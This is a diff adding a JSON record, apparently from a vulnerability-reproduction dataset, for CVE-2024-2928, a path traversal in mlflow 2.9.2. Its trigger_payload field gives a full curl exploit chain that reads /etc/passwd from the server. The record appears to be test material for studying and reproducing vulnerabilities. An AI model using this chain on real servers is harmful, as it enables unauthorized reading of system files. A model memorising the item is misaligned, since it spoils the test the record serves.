@@ -1,0 +1,15 @@
+{
+  "file_id": "168_mlflow_huntr_19bf02d7-6393-4a95-b9d0-d6d4d2d8c298",
+  "numeric_id": "168",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Path traversal via URI fragment parsing confusion in mlflow",
+  "cve": "CVE-2024-2928",
+  "cwe": "CWE-29: Path Traversal",
+  "library": "mlflow",
+  "affected_version": "== 2.9.2",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "curl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"artifact_location\": \"http:///#/../../../../../../../../../../../../../../etc/\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/experiments/create'\ncurl -X POST -H 'Content-Type: application/json' -d '{\"experiment_id\": \"{{EXPERIMENT_ID}}\"}' 'http://127.0.0.1:5000/api/2.0/mlflow/runs/create'\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create'\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"run_id\": \"{{RUN_ID}}\", \"source\": \"file:///etc/\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'\ncurl 'http://127.0.0.1:5000/model-versions/get-artifact?path=passwd&name=poc&version=1'",
+  "oracle": "arbitrary file read, such as /etc/passwd"
+}
